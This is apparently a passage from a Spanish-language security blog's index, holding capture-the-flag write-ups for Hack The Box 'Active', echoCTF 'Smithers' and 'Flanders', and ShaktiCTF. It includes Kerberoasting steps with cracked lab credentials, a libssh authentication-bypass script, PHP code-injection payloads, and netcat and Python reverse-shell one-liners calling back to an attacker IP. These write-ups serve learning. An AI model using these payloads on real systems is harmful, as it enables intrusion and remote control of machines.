kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-20 01:37:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC 49166/tcp open msrpc Microsoft Windows RPC 49167/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled and required | smb2-time: | date: 2022-01-20T01:38:13 |_ start_date: 2022-01-20T01:34:15 |_clock-skew: 6m45s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.52 seconds Enumeraci√≥n Servicios smb - 445 Manual Se identificaron folders compartidos haciendo uso de smbclient de los cuales se permitia el acceso an√≥nimo al share de Replication.\nAl conectarse al directorio compartido de Replication se usaron los comandos:\n prompt off - Para deshabilitar la confirmaci√≥n al descargar cualquier archivo. recurse on - Para habilitar la recursividad si se llega a encontrar un directorio. mget * - Para descargar todos los archivos y directorios disponibles.  Se identific√≥ un archivo el cual expone un usuario y un hash disponible para crackear.\nContenido de Groups.xml:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; Explotaci√≥n Descrifrado de GPP Ejecuci√≥n Al identificar qu√© tipo de credencial es la que se encuentra en Groups.xml se identific√≥ una vulnerabilidad relacionada con las Group Policy Preferences, dado el leak de la llave y suponiendo que la m√°quina no se encuentra parchada se puede descifrar la contrase√±a haciendo uso de gpp-decrypt.\nKerberoasting Ejecuci√≥n Dados los puertos abiertos que tiene la m√°quina se puede intuir que la m√°quina objetivo es un Domain Controller, contemplado esto y que se cuenta con credenciales se puede hacer uso de impacket-GetUserSPNs para buscar conseguir un hash de alguna otra cuenta que permita el acceso a la m√°quina. Utilizando:\nimpacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request Al identificar el error de sesi√≥n se√±alado debido a que la hora de la m√°quina no corresponde con la que se utiliza, se ocupa ntpdate para sincronizar la hora local con la de la m√°quina objetivo, se√±alando que el √∫nico comportamiento funcional encontrado fue utilizando el hostname de la m√°quina por lo que se modific√≥ /etc/hosts para a√±adir la entrada del hostname con la IP, configurando as√≠ la hora local.\nPosteriormente se ejecut√≥ de nuevo la herramienta de impacket para obtener el hash.\nHash obtenido:\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b9225835ed0789a77d29228e13c82766$9bf95664d6316261f490688514dadd5470eb70fed87666be26d2e2fbe30691d7ce3377cf176e3bb2e0d459a6a7d25153e89ef9a44d13e16012e3ba81bc3b19a84653d112df3c4e21329bed80b91938da785d8aed471821a4c990559930aee3312e70cccdbbeb52c3c454c4d4b712c9ebf66602062bfc993d7de4c4250f8706a98b75109467a74522538816a92d462c8e7279556c4f3e4f9fe8447d326876fa169608c143847436fb761b2f0aa5122b90f5af045b73a1d2fa2a7e9f432fab538302dc6575d1d5095e89e7d66febce084b6fad6deb79cbd1db17f7cbd49907b0bed27958ade09ef2ed7baaf1e18d5d368c5c29aa614e8584669dd8d6a4d52bdebabfdaa48b68b4db41411aef874ea76c301b9fff65f81c48822e263530b788cc75231fdd78c3879ad254e92edbe4b7efb8909d37ec1699f58b75a32b73da4fca77ae566d5b3c1b1ae67a74cae08988429d54694bc1f3030cbc5aa59113b35129a98f2c32d6faa69816facb1153327d242019a5a2aad1ba5420449421a39b6a250e424ed9d8863edb0429ff54d33df78d3bed41ac41ca509250750cfc4db6dc91ced953db230554b681fd5569407664542f2fac85f3d385ca42038c9d8e7eaacfe07dd480efeeb6843127d084b0a08be254bfe9166e810108590e7e064bbe36e3d3a6faf5d05fab1015536cc34b8cdc27d80450a0b139bcd8ece127c6600218c3d1a75558aac8bf3094a5ca6d98bfc309b89d7e7fb1a03df601d98be07e26fa746629a5fa7492e489154348dcfd29800ab9fc49bb793a430510564a8525da693112b9243a4840b59360e7ca1d449f5faf35a15aa4902d94c1ed0dca1b3d8c0ea083f4c823f17c730c9bfbdb9c93abc9250cdface8a4da66da5c6868c4de96f344c4102ab56be8385237a0755ac26a8f7119fc55e698748c14ae37ec11c8a4e534e2ebf99c12877b64bf9ef636d487afee40de5115a5aff0f8ca7a2f059b4e56db5dea6069fc56ece3bd63d47b13889cad441635f6ac03d5688ea7041811ff55a462e0292bfe1f234b8a5994dd8efe0b4fde336d4815026e80ae3f96a9d025db0d9ba55183ed2a53e8b3f002e3aa5d3f744f8b46322dba0918130fc0b7f4a85342cae3a14fc9a555983668dd5c7ad63934a407e7a055c610b371bf3772c8e85b173ab9bdb22f76e9fbef451678abfb3db0a300d0c18db7ba907536d1dc3008b4488fee3d4bde9e8d719001bb7ebdf66df8f18132eb9d2d867d207bcb Lo que resultar√≠a en buscar el crackeo del hash obtenido (ejecut√°ndolo en esta ocasi√≥n usando john) para poder obtener acceso a la m√°quina, haciendo uso de impacket-psexec proporcionando las credenciales obtenidas.\nCredenciales obtenidas    Alcance Usuario Contrase√±a (hash ‚Üí pass) Fuente     SO SVC_TGS edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ‚Üí GPPstillStandingStrong2k18 smb (Groups.xml) + gpp-decrypt   SO Administrator $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b92258... ‚Üí Ticketmaster1968 impacket-GetUserSPNs + cracking    ","permalink":"https://srrequiem.xyz/posts/htb-active/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Active   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores eks \u0026amp; mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ‚ùØ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Active"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre smithers   Dificultad Beginner   Banderas 7 (5 other, env, root)   Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)   Descripci√≥n / Pistas Like Smithers this server will serve you well only if you manage to enter it\u0026rsquo;s memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag.    Reconocimiento Escaneo de host Escaneo completo de puertos ‚ùØ nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:45 CDT Initiating Connect Scan at 19:45 Scanning 10.0.100.142 [65535 ports] Discovered open port 11211/tcp on 10.0.100.142 Discovered open port 10888/tcp on 10.0.100.142 Completed Connect Scan at 19:45, 21.90s elapsed (65535 total ports) Nmap scan report for 10.0.100.142 Host is up, received user-set (0.14s latency). Scanned at 2021-10-14 19:45:20 CDT for 22s Not shown: 53830 closed ports, 11703 filtered ports Reason: 53830 conn-refused and 11703 no-responses Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 10888/tcp open unknown syn-ack 11211/tcp open memcache syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds Escaneo espec√≠fico ‚ùØ nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:46 CDT Nmap scan report for 10.0.100.142 Host is up (0.14s latency). PORT STATE SERVICE VERSION 10888/tcp open http nginx |_http-title: Network Tools 11211/tcp open memcached Memcached 1.5.12 (uptime 36084 seconds) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds Enumeraci√≥n Servicios http - 10888 Manual Al navegar al sitio se visualiza alg√∫n tipo de servicio que pone a disposici√≥n utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en alg√∫n tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass b√°sico a esta validaci√≥n se decidi√≥ jugar un poco con cabeceras como X-Forwarded-For entre otras, para ver si la respuesta por parte del servidor cambiaba de alg√∫n modo, sin √©xito aparente.\nmemcached - 11211 Manual Siendo permitida la conexi√≥n directa mal socket mediante netcat se permite la obtenci√≥n de datos existentes en el servidor mediante comandos propios de memcached, datos como versi√≥n, estatus, slabs, items, entre otros.\nComandos √∫tiles\nDespu√©s de entablar la conexi√≥n\nversion # Obtener versi√≥n stats # Obtener estatus stats slabs # Obtener slabs stats items # Obtener items de slabs con informaci√≥n stats cachedump \u0026lt;numero_de_item\u0026gt; 0 # Obtener nombres de llaves (0 es para no limitar el tama√±o del output) get \u0026lt;nombre_de_item\u0026gt; # Obtener informaci√≥n guardada de item Referencia: https://book.hacktricks.xyz/pentesting/11211-memcache\nRecalcando que para la obtenci√≥n del n√∫mero de item se puede extraer de la columna se√±alada del output generado por la obtenci√≥n de los items.\nExplotaci√≥n Habiendo encontrado que se puede exfiltrar informaci√≥n mediante la interacci√≥n con el servicio de memcached faltar√≠a validar si tambi√©n se puede configurar informaci√≥n en el servicio.\nAbuso de escritura de items en memcached Pasos previos | Preparaci√≥n Dentro de la enumeraci√≥n se encontr√≥ que la versi√≥n de memcached y la informaci√≥n contenida al navegar al sitio expuesto coincid√≠a por lo que bajo la suposici√≥n de que estos dos interactuan entre s√≠ y de no haber encontrado el item REMOTE_ADDR como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.\nSintaxis\nset key flags exptime bytes value Uso\nset REMOTE_ADDR 0 2592000 4 test Referencia: https://www.tutorialspoint.com/memcached/memcached_set_data.htm\nAl tener problemas de interacci√≥n directa para configurar los valores se encontraron otras alternativas funcionales.\nM√©todo 1 Comando\necho -e 'set REMOTE_ADDR 0 2592000 4\\r\\ntest\\r' | nc -nv -w 1 10.0.100.142 11211\n Ejecuci√≥n. Validaci√≥n de existencia (cuando antes no se desplegaba el item 1). Obtenci√≥n de valor de valor.  M√©todo 2 El paquete libmemcached-tools cuenta con utilidades para interactuar con conexiones de memcached. Haciendo uso de memccp se puede copiar un valor pasando como par√°metro el archivo con el valor que se piensa ocupar y haciendo uso de memcat para la visualizaci√≥n de los valores de los items.\nsudo apt install libmemcached-tools echo -n \u0026#34;test2\u0026#34; \u0026gt; REMOTE_ADDR memccp --servers=10.0.100.142 REMOTE_ADDR memccat --servers=10.0.100.142 REMOTE_ADDR Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/\nEjecuci√≥n Configurando la variable que concuerda con ambos servicios y a√±adiendo la asignada por la vpn el output de la p√°gina resulta diferente.\nA partir de este punto se puede observar que se habilita un formulario para realizar un ping a un host, lo que a nivel de c√≥digo se puede reducir en algo como:\n$ip = \u0026#34;valor proporcionado por formulario\u0026#34; system(\u0026#39;ping \u0026#39; . $ip); Lo que al final se reducir√≠a en ejecuci√≥n remota de comandos, ya que en consola podemos usar \u0026ldquo;separadores\u0026rdquo; para ejecutar m√∫ltiples comandos en una misma instrucci√≥n, lo que a nivel de c√≥digo se ejemplificar√≠a en ping 127.0.0.1; whoami.\nAl ver el servicio lo ejecuta directamente root, al obtener una reverse shell, no se requirir√≠a proceso de escalaci√≥n de privilegios.\nAl realizar la prueba para obtener una reverse shell con netcat usando ;nc -e /bin/bash 10.10.0.26 1234 no se ejecut√≥ satisfactoriamente por lo que se opt√≥ intentar con diferentes alcances, siendo python3 el funcional (;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.0.26\u0026quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;sh\u0026quot;)').\nUbicaci√≥n de banderas  Llave - valor de memcached. /var/lib/nginx/html/network-tools.php x 3. / Extrayendo las variables de entorno de los procesos en ejecuci√≥n con strings /proc/*/environ | grep ETSCTF. /root.  ","permalink":"https://srrequiem.xyz/posts/echoctf_smithers/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre smithers   Dificultad Beginner   Banderas 7 (5 other, env, root)   Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)   Descripci√≥n / Pistas Like Smithers this server will serve you well only if you manage to enter it\u0026rsquo;s memcached store. The memcache service you just discovered on smithers.","title":"echoCTF - Smithers"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre flanders   Dificultad Beginner   Banderas 4 (2 system, env, root)   Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)   Descripci√≥n / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is Okily Dokily. Catch phrase sounds like a pass phrase, only without space    Reconocimiento Escaneo de host Escaneo completo de puertos ‚ùØ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:35 CDT Initiating SYN Stealth Scan at 09:35 Scanning 10.0.100.34 [65535 ports] Discovered open port 6022/tcp on 10.0.100.34 Completed SYN Stealth Scan at 09:35, 14.77s elapsed (65535 total ports) Nmap scan report for 10.0.100.34 Host is up, received user-set (0.14s latency). Scanned at 2021-10-27 09:35:04 CDT for 15s Not shown: 65534 closed ports Reason: 65534 resets PORT STATE SERVICE REASON 6022/tcp open x11 syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds Raw packets sent: 72729 (3.200MB) | Rcvd: 70809 (2.832MB) Escaneo espec√≠fico ‚ùØ nmap -sCV -p 6022 -oN nmap/targeted $BOX_TARGET Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:48 CDT Nmap scan report for 10.0.100.34 Host is up (0.14s latency). PORT STATE SERVICE VERSION 6022/tcp open ssh libssh 0.8.1 (protocol 2.0) | ssh-hostkey: |_ 2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4.85 seconds Enumeraci√≥n Servicios (nombre - puerto) ssh - 6022 Manual Dado el reconocimiento por medio de nmap se puede identificar que se est√° corriendo un servidor ssh en un puerto no convencional y se expone la versi√≥n libssh 0.8.1, despu√©s de una b√∫squeda se puede identificar que la versi√≥n expuesta cuenta con una vulnerabilidad la cu√°l explota un bypass de autenticaci√≥n, reportada en el CVE-2018-10933.\nSe encontraron diversos scripts en python que abusan de la vulnerabilidad:\n https://www.exploit-db.com/exploits/45638 https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d  Explotaci√≥n libSSH Authentication Bypass Pasos previos | Preparaci√≥n Como parte de los scripts buscados se encontr√≥ el siguiente c√≥digo en un script que result√≥ bastante simple de ejecutar, √∫nicamente realizando los cambios pertinentes de ip, puerto y comando (entablando una reverse shell).\nScript\n#!/usr/bin/python3 import sys import paramiko import socket s=socket.socket() s.connect((\u0026#34;10.0.100.34\u0026#34;,6022)) m=paramiko.message.Message() t=paramiko.transport.Transport(s) t.start_client() m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS) t._send_message(m) c=t.open_session(timeout=5) c.exec_command(\u0026#34;nc -e /bin/bash 10.10.0.26 1234\u0026#34;) out=c.makefile(\u0026#34;rb\u0026#34;,2048) output=out.read() out.close() print (output) Ejecuci√≥n  Ejecuci√≥n de script. Listener de reverse shell.  Post Explotaci√≥n Enumeraci√≥n Realizando enumeraci√≥n manual se puede observar que el directorio principal del usuario al que se accede ETSCTF contiene una llave ssh que a primera impresi√≥n apuntar√≠a a un m√©todo de escalaci√≥n de privilegios a root.\n Directorio. Llave. Usuario al que pertenece.  Escalaci√≥n de privilegios ETSCTF ‚Üí root La idea inicial a seguir ser√≠a extraer la llave encontrada para intentar acceder al sistema con ella, dado que ning√∫n intento funcion√≥, se puede tratar de ubicar si existe alg√∫n otro medio de acceso a la m√°quina por el cu√°l est√© restringida a conexiones provenientes √∫nicamente desde local, es decir, de flanders hacia flanders. Para comprobar esto se puede buscar si alg√∫n servicio de ssh est√° ejecutandose y si existe alg√∫n puerto que est√© a la escucha de nuevas conexiones.\nLa salida del comando mapea autom√°ticamente los puertos com√∫nes para el servicio siendo as√≠ que 127.0.0.1:ssh ser√≠a lo mismo que 127.0.0.1:22, verificando de esta manera que se escuchan conexiones ssh localmente.\nEn esta comprobaci√≥n se puede ver que se est√° ejecutando sshd correspondiente al servidor de ssh en linux.\nSe suelen proteger las llaves ssh con passphrases y observando que en la descripci√≥n de la m√°quina se proporciona una passphrase (Okily Dokily) se pudiera concluir que al hacer uso de la llave se pedir√°.\nLogrando as√≠ satisfactoriamente la escalaci√≥n de privilegios.\nUbicaci√≥n de banderas  /etc/passwd. /etc/shadow. Extrayendo las variables de entorno de los procesos en ejecuci√≥n con strings /proc/*/environ | grep ETSCTF. /root.  ","permalink":"https://srrequiem.xyz/posts/echoctf_flanders/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre flanders   Dificultad Beginner   Banderas 4 (2 system, env, root)   Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)   Descripci√≥n / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is Okily Dokily. Catch phrase sounds like a pass phrase, only without space    Reconocimiento Escaneo de host Escaneo completo de puertos ‚ùØ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn).","title":"echoCTF - Flanders"},{"content":"Intro El d√≠a 3 abril del 2021 TeamShakti public√≥ su anual competici√≥n CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisi√≥n de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca hab√≠a participado en un CTF. Me pareci√≥ una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el pr√≥ximo CTF de Hackthebox.\nPresento un Write-up de los retos que pude resolver durante mi participaci√≥n.\nForensics Follow up - 50 Descripci√≥n We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.\nnetwork1.pcapng\nSoluci√≥n Se descarg√≥ un archivo tipo pcapng se identific√≥ un stream TCP con wireshark y se sigui√≥ dicho stream el cu√°l proporcion√≥ un pastebin\nDentro del contenido del pastebin ven√≠a la bandera\nBandera: shaktictf{Th15_w4s_eA5Y!!}\nDelete - 100 Descripci√≥n Sometimes what you see is not always true\u0026hellip;\nchall.png\nSoluci√≥n Se descarg√≥ la imagen y despu√©s analizar el archivo con binwalk se vio que hab√≠a aparentemente dos im√°genes en el mismo archivo, siguiendo la pista del t√≠tulo del reto se separaron los bytes iniciales que correspond√≠an a la primera imagen usando dd\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/shaktictf/forensics] ‚îî‚îÄ$ binwalk chall.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 264 x 191, 8-bit colormap, non-interlaced 48 0x30 PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced 89 0x59 Zlib compressed data, default compression ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/shaktictf/forensics] ‚îî‚îÄ$ dd skip=48 if=chall.png of=chall1.png bs=1 46287+0 records in 46287+0 records out 46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s De esa manera chall1.png se vuelve una imagen que se puede visualizar con un visor de im√°genes sin ning√∫n problema. Obteniendo as√≠ la bandera.\nBandera: shaktictf{Y0u_4R3_aM4z1nG!!!!}\nWeb Magic - 100 Descripci√≥n I found creating new functionalities as magic. So I went and created quite a few, now I don\u0026rsquo;t remember what is what. help me remember them :( !\ncheck out my application - http://35.238.173.184/\nSoluci√≥n De acuerdo con el log que se dio en /admin.php se busc√≥ alguna vulnerabilidad respecto a la menci√≥n de una funci√≥n deprecada create_function() y se observ√≥ que era vulnerable a inyecci√≥n de c√≥digo.\nPermitiendo el listado de archivos en el directorio mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;ls -la\u0026quot;);/*\u0026quot;]\ntotal 84 drwxrwxrwx 1 www-data www-data 4096 Apr 3 11:43 . drwxr-xr-x 1 root root 4096 Mar 31 09:51 .. -rw-r--r-- 1 www-data www-data 0 Apr 3 11:02 12345642312 -rw-r--r-- 1 www-data www-data 65 Apr 2 23:39 1998_Dumb_secrets.php -rw-rw-r-- 1 www-data www-data 134 Apr 2 23:19 Dockerfile -rw-r--r-- 1 www-data www-data 39 Apr 3 11:40 a -rw-r--r-- 1 www-data www-data 0 Apr 3 11:39 aaa -rw-r--r-- 1 www-data www-data 1 Apr 3 11:40 aaaa -rw-r--r-- 1 www-data www-data 3251 Apr 2 22:45 admin.php lrwxrwxrwx 1 www-data www-data 8 Apr 3 11:43 asd -\u0026gt; flag.txt -rw-r--r-- 1 www-data www-data 1886 Apr 2 22:45 chat.html -rw-r--r-- 1 www-data www-data 1744 Apr 2 22:45 check.html drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 css -rw-r--r-- 1 www-data www-data 39 Apr 3 09:58 flag.html -rw-r--r-- 1 www-data www-data 39 Apr 3 11:35 flag.php -rw-r--r-- 1 www-data www-data 39 Apr 3 09:57 flag.txt drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 fonts -rw-r--r-- 1 www-data www-data 1935 Apr 2 22:45 index.html -rw-r--r-- 1 www-data www-data 2114 Apr 2 22:45 login.html -rw-r--r-- 1 www-data www-data 1949 Apr 2 22:45 report.html -rw-r--r-- 1 www-data www-data 1976 Apr 2 22:45 rules.html -rw-r--r-- 1 www-data www-data 0 Apr 3 11:04 s.php -rw-r--r-- 1 www-data www-data 5 Apr 3 10:06 test.php Contenido de admin.php mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat admin.php\u0026quot;);/*\u0026quot;]\nVer c√≥digo fuente del resultado\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); $success = \u0026#39; \u0026lt;div class=\u0026#34;alert alert-success alert-dismissible\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;alert\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; Function declared. \u0026lt;/div\u0026gt; \u0026#39;; include \u0026#34;flag.php\u0026#34;; if (isset ($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; !empty ($_POST[\u0026#39;c\u0026#39;])) { $blacklist = \u0026#34;/mv|rm|exec/i\u0026#34;; $code = $_POST[\u0026#39;c\u0026#39;]; if(strlen($code)\u0026gt;60) { die(\u0026#34;too long to execute\u0026#34;); } if(preg_match($blacklist,$code)){ die(\u0026#34;that\u0026#39;s blocked\u0026#34;); } $fun = create_function(\u0026#39;$flag\u0026#39;, $code); print($success); } ?\u0026gt;Habiendo identificado un archivo que no es com√∫n 1998_Dumb_secrets.php se intent√≥ ver su contenido mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nObteniendo como resultado\ntoo long to execute\nObservando el c√≥digo que procesa la petici√≥n, vemos que verifica la longitud del formulario por lo que si acortamos el valor enviado, la funci√≥n nos dejar√° leer el archivo que queremos. Utilizando:\nreturn -1;}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nVer c√≥digo fuente del resultado\n\u0026lt;?php $flag1=\u0026quot;shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\u0026quot;; ?\u0026gt; Bandera: shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\nCrypto Classically Easy - 50 Descripci√≥n ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\nSoluci√≥n Realizando un poco de an√°lisis a la cadena que se presenta en la descripci√≥n del reto se puede ver claramente que presenta un formato de bandera con excepci√≥n de los caract√©res especiales, por lo que despu√©s de descartar las opciones que pudieran servir para descifrarla (Cifrado C√©sar, ROT N). Se trat√≥ de hacer otro alcance siguiendo el mismo principio de la rotaci√≥n.\n   Char Recibido Valor de rotaci√≥n Char Conocido     o +4 s   v +12 h   m +14 a   o +22 k   g +13 t   e +4 i   q +12 c   f +14 t   j +22 f    Lo que podr√≠a significar un patr√≥n n√∫merico de rotaci√≥n dada la repetici√≥n de los espacios recorridos del char dado y el char de la bandera, siendo +4,+12,+14,+22,+13.\nEjercicio manual de sustituci√≥n\nshaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}\nOptimizaci√≥n del m√©todo por medio de un script simple.\n#!/usr/bin/python abc = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; values = [4,12,14,22,13] decrypt = \u0026#34;ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\u0026#34; avoid = \u0026#34;{}_!\u0026#34; flag = \u0026#34;\u0026#34; valIndex = 0 for letter in decrypt: if letter in avoid: flag += letter continue if valIndex \u0026gt;= len(values): valIndex = 0 flag += abc[(abc.index(letter) + values[valIndex]) - len(abc)] valIndex += 1 print(flag) Resultado del script\nBandera: shaktictf{lets_start_with_something_classical!}\nMisc Sanity Check - 10 Al leer las reglas dentro del servidor de discord se encuentra la bandera\n13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}\nBandera: shaktictf{G00d_t0_r34d_th3_rUl3s!}\ndecodeit - 100 Descripci√≥n just decode it!\nSoluci√≥n Imagen descargada en c√≥digo de barras\nSe utiliz√≥ https://zxing.org/w/decode.jspx para decodear la imagen y obtener la bandera\nDecode Succeeded Raw text\tshaktictf{N1C3_w0rK_Fr13nD} Raw bytes\t68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f 57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a Barcode format\tCODE_128 Parsed Result Type\tTEXT Parsed Result\tBandera: shaktictf{N1C3_w0rK_Fr13nD}\n√öltimas palabras Considerando que fue \u0026ldquo;one-man show\u0026rdquo; se obtuvo el lugar 156 de 452 en el ranking con un puntaje de 410 puntos.\nWrite-ups no oficiales de algunos retos\n","permalink":"https://srrequiem.xyz/posts/first-ctf/","summary":"Intro El d√≠a 3 abril del 2021 TeamShakti public√≥ su anual competici√≥n CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisi√≥n de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca hab√≠a participado en un CTF. Me pareci√≥ una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el pr√≥ximo CTF de 